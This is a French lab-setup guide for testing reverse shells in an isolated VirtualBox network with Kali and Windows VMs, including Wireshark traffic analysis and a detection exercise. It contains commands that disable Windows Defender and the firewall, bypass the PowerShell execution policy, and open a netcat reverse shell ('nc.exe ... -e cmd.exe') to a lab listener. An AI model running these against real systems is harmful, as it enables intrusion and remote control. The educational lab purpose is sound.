# Setup du Laboratoire - Reverse Shell Testing

Guide complet pour configurer un environnement de laboratoire isole pour tester les reverse shells de maniere pedagogique et securisee.

## LAB PERSONNEL UNIQUEMENT

Ce guide est pour votre apprentissage personnel dans un environnement totalement isole.

---

## Architecture du Lab

```
┌─────────────────────────────────────────────────────┐
│  RESEAU ISOLE (Internal Network)                    │
│  Subnet: 192.168.100.0/24                           │
│  PAS D'ACCES INTERNET                               │
├─────────────────────────────────────────────────────┤
│                                                     │
│  ┌──────────────────┐      ┌──────────────────┐   │
│  │  Kali Linux      │      │  Windows 10/11   │   │
│  │  (Attaquant)     │      │  (Cible)         │   │
│  ├──────────────────┤      ├──────────────────┤   │
│  │  IP: 192.168.100.10      │  IP: 192.168.100.20   │
│  │  Listener Python │◄─────┤  Reverse Shell   │   │
│  │  Port: 4444      │      │  PowerShell      │   │
│  └──────────────────┘      └──────────────────┘   │
│                                                     │
└─────────────────────────────────────────────────────┘
```

---

## Prerequis

### Logiciel de Virtualisation

**Option 1: VirtualBox (Gratuit)**
- Telecharger: https://www.virtualbox.org/
- Version recommandee: 7.0+
- Support Windows, macOS, Linux

**Option 2: VMware Workstation/Fusion**
- VMware Workstation Pro (Windows/Linux)
- VMware Fusion (macOS)
- Version gratuite pour usage personnel disponible

### Images de VMs

**1. Kali Linux (Attaquant)**
- Telecharger: https://www.kali.org/get-kali/#kali-virtual-machines
- Format: VirtualBox (.ova) ou VMware (.vmx)
- Taille: ~3-4 GB
- Credentials par defaut: kali / kali

**2. Windows 10/11 (Cible)**
- Telecharger: https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
- Valide 90 jours (renouvelable)
- OU: Windows Evaluation Center
- OU: Votre propre license Windows

---

## Etape 1: Creation des VMs

### 1.1 Importer Kali Linux

**VirtualBox:**
```
File > Import Appliance
Selectionner fichier .ova Kali Linux
Importer
```

**Configuration recommandee:**
- RAM: 2048 MB minimum
- CPU: 2 cores
- Disk: 20 GB minimum
- Network: Internal Network (a configurer)

### 1.2 Creer VM Windows

**VirtualBox:**
```
New > Expert Mode
Name: Windows-Lab
Type: Microsoft Windows
Version: Windows 10 (64-bit)
Memory: 2048 MB
Create Virtual Hard Disk: 50 GB
Finish
```

**Attacher l'ISO Windows:**
```
Settings > Storage > Controller: IDE
Cliquer sur Empty CD icon
Choose a disk file > Selectionner Windows ISO
OK
Start VM > Installer Windows
```

---

## Etape 2: Configuration Reseau Isole

### 2.1 Creer Internal Network

**VirtualBox:**
```
File > Host Network Manager (ou Tools > Network)
Create
Configure:
  - Adapter: Manually
  - IPv4 Address: 192.168.100.1
  - IPv4 Network Mask: 255.255.255.0
  - DHCP Server: Disabled
```

### 2.2 Configurer Kali Linux

**Dans VirtualBox:**
```
Kali VM > Settings > Network
Adapter 1:
  - Attached to: Internal Network
  - Name: intnet (ou nom choisi)
  - OK
```

**Demarrer Kali et configurer IP statique:**
```bash
# Devenir root
sudo -i

# Editer configuration reseau
nano /etc/network/interfaces

# Ajouter:
auto eth0
iface eth0 inet static
    address 192.168.100.10
    netmask 255.255.255.0
    network 192.168.100.0
    broadcast 192.168.100.255

# Sauvegarder (Ctrl+X, Y, Enter)

# Redemarrer reseau
systemctl restart networking

# Verifier
ip addr show eth0
# Devrait afficher: 192.168.100.10
```

### 2.3 Configurer Windows

**Dans VirtualBox:**
```
Windows VM > Settings > Network
Adapter 1:
  - Attached to: Internal Network
  - Name: intnet (MEME que Kali)
  - OK
```

**Demarrer Windows et configurer IP statique:**
```
Settings > Network & Internet > Ethernet
Change adapter options
Ethernet > Properties
Internet Protocol Version 4 (TCP/IPv4) > Properties
Use the following IP address:
  - IP address: 192.168.100.20
  - Subnet mask: 255.255.255.0
  - Default gateway: (laisser vide)
  - DNS: (laisser vide)
OK
```

### 2.4 Tester Connectivite

**Sur Kali:**
```bash
ping 192.168.100.20
# Devrait repondre
```

**Sur Windows:**
```powershell
ping 192.168.100.10
# Devrait repondre
```

**Verifier isolation:**
```bash
# Sur Kali
ping 8.8.8.8
# Ne devrait PAS repondre (pas d'Internet)
```

---

## Etape 3: Preparation de Windows (Cible)

### 3.1 Desactiver Windows Defender (LAB UNIQUEMENT!)

**PowerShell (Administrateur):**
```powershell
# Desactiver Real-Time Protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Desactiver Cloud-based Protection
Set-MpPreference -MAPSReporting Disabled

# Verifier
Get-MpPreference | Select-Object DisableRealtimeMonitoring
```

### 3.2 Desactiver Firewall (LAB UNIQUEMENT!)

**PowerShell (Administrateur):**
```powershell
# Desactiver tous les profils
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Verifier
Get-NetFirewallProfile | Select-Object Name, Enabled
```

### 3.3 Configurer PowerShell

**Autoriser execution de scripts:**
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
```

### 3.4 Creer Dossier de Travail

```powershell
New-Item -Path C:\Lab -ItemType Directory
Set-Location C:\Lab
```

---

## Etape 4: Preparation de Kali (Attaquant)

### 4.1 Mettre a Jour Kali

```bash
sudo apt update
sudo apt upgrade -y
```

### 4.2 Installer Outils (si manquants)

```bash
# Python 3 (normalement pre-installe)
python3 --version

# Netcat
sudo apt install netcat-traditional -y

# Metasploit (pre-installe sur Kali)
msfconsole -v

# Wireshark (pour capture)
sudo apt install wireshark -y
```

### 4.3 Creer Dossier de Travail

```bash
mkdir -p ~/lab/reverse-shells
cd ~/lab/reverse-shells
```

---

## Etape 5: Transfert de Fichiers vers Windows

### Methode 1: Shared Folder (VirtualBox)

**Configuration:**
```
Windows VM > Settings > Shared Folders
Add new shared folder
Folder Path: /path/on/host/professional-pentest-toolkit
Folder Name: toolkit
Auto-mount: Yes
OK
```

**Acces dans Windows:**
```
Ce PC > Network > VBOXSVR > toolkit
Copier fichiers vers C:\Lab
```

### Methode 2: Python HTTP Server

**Sur Kali:**
```bash
cd /path/to/professional-pentest-toolkit/lab-educational/simple-examples
python3 -m http.server 8000
```

**Sur Windows:**
```powershell
# Telecharger le script
Invoke-WebRequest -Uri "http://192.168.100.10:8000/basic-reverse-shell.ps1" `
    -OutFile "C:\Lab\basic-reverse-shell.ps1"
```

### Methode 3: Copier-Coller

**Simplement copier le contenu et coller dans:**
```powershell
notepad C:\Lab\basic-reverse-shell.ps1
# Coller le code
# Sauvegarder
```

---

## Etape 6: Premier Test - Script Simple

### 6.1 Sur Kali - Demarrer Listener

```bash
cd ~/lab/reverse-shells

# Copier listener.py depuis le toolkit
cp /path/to/professional-pentest-toolkit/lab-educational/simple-examples/listener.py .

# Rendre executable
chmod +x listener.py

# Demarrer listener
python3 listener.py -p 4444
```

**Output attendu:**
```
[*] Listener pedagogique actif
[*] Adresse: 0.0.0.0:4444
[*] En attente de connexion...
```

### 6.2 Sur Windows - Executer Reverse Shell

```powershell
# Aller dans le dossier
cd C:\Lab

# Executer le script
powershell.exe -File basic-reverse-shell.ps1 -ListenerIP 192.168.100.10 -ListenerPort 4444
```

### 6.3 Interaction

**Sur Kali, vous devriez voir:**
```
[+] CONNEXION RECUE!
[+] Adresse client: 192.168.100.20

====================================
CONNEXION ETABLIE - LAB PEDAGOGIQUE
====================================
Hostname: DESKTOP-XXXXX
Username: User
...

PS C:\Lab>
```

**Tester des commandes:**
```powershell
whoami
# Output: desktop-xxxxx\user

Get-Process | Select-Object -First 5
# Liste des processus

ipconfig
# Configuration reseau

pwd
# Repertoire actuel

help
# Aide des commandes

exit
# Fermer connexion
```

---

## Etape 7: Capture de Trafic avec Wireshark

### 7.1 Demarrer Wireshark sur Kali

```bash
sudo wireshark &
```

### 7.2 Capturer le Trafic

```
Capture > eth0 (interface reseau)
Start
```

### 7.3 Filtrer le Trafic

```
Filter: tcp.port == 4444
Apply
```

### 7.4 Refaire le Test

1. Demarrer listener (Kali)
2. Executer reverse shell (Windows)
3. Taper quelques commandes

### 7.5 Analyser

**Observer dans Wireshark:**
- Handshake TCP (SYN, SYN-ACK, ACK)
- Donnees en TEXTE CLAIR (pas d'encryption!)
- Commandes visibles
- Resultats visibles

**Follow TCP Stream:**
```
Right-click sur packet
Follow > TCP Stream
```

**Vous verrez TOUT en clair:**
```
whoami
desktop-xxxxx\user

ipconfig
...
```

**CONCLUSION:**
Sans encryption, TOUT est visible sur le reseau!

---

## Etape 8: Snapshots

### Creer Snapshot "Clean State"

**Avant chaque test:**
```
VirtualBox > Machine > Take Snapshot
Name: Clean State Before Test
Description: Windows avec Defender desactive, pret pour test
Take
```

**Pour revenir:**
```
Machine > Snapshots
Select "Clean State Before Test"
Restore
```

---

## Troubleshooting

### Probleme: Pas de ping entre VMs

**Solutions:**
1. Verifier que les deux VMs sont sur "Internal Network"
2. Verifier nom du network (doit etre identique)
3. Verifier IPs statiques configurees
4. Sur Windows, firewall peut bloquer ping (desactiver)

### Probleme: Listener ne demarre pas

**Erreur: "Address already in use"**
```bash
# Verifier si port utilise
sudo lsof -i :4444

# Tuer processus si necessaire
sudo kill -9 <PID>
```

**Erreur: "Permission denied" (port < 1024)**
```bash
# Utiliser sudo
sudo python3 listener.py -p 443
```

### Probleme: Reverse shell ne se connecte pas

**Verifications:**
1. Listener est actif?
2. IP correcte? (192.168.100.10)
3. Port correct? (4444)
4. Firewall Windows desactive?
5. Connectivity (ping fonctionne?)

**Debug sur Windows:**
```powershell
# Tester connexion TCP
Test-NetConnection -ComputerName 192.168.100.10 -Port 4444
```

### Probleme: PowerShell bloque execution

**Erreur: "execution of scripts is disabled"**
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser
```

---

## Exercices Pratiques

### Exercice 1: Comprendre le Trafic

1. Demarrer Wireshark
2. Capturer pendant test reverse shell
3. Analyser chaque packet
4. Identifier: handshake, commandes, resultats

### Exercice 2: Comparer avec Netcat

**Sur Kali:**
```bash
nc -lvnp 4444
```

**Sur Windows:**
```powershell
# Telecharger netcat pour Windows
# https://eternallybored.org/misc/netcat/

nc.exe 192.168.100.10 4444 -e cmd.exe
```

**Comparer:**
- Simplicite
- Fonctionnalites
- Detection

### Exercice 3: Tester Detection

1. Reactiver Windows Defender
2. Tenter meme test
3. Observer comportement
4. Analyser Event Logs

```powershell
# Reactiver Defender
Set-MpPreference -DisableRealtimeMonitoring $false

# Executer reverse shell
# Observe: Sera bloque!

# Voir logs
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 20
```

---

## Prochaines Etapes

Maintenant que votre lab est configure:

1. **Lire concepts** - `../concepts/reverse-shell-explained.md`
2. **Tester scripts simples** - Comprendre mecaniques
3. **Etudier avec Wireshark** - Voir communications
4. **Passer a Metasploit** - Outils professionnels
5. **Apprendre detection** - Sysmon, Event Logs

---

**Votre lab est pret pour l'apprentissage!**
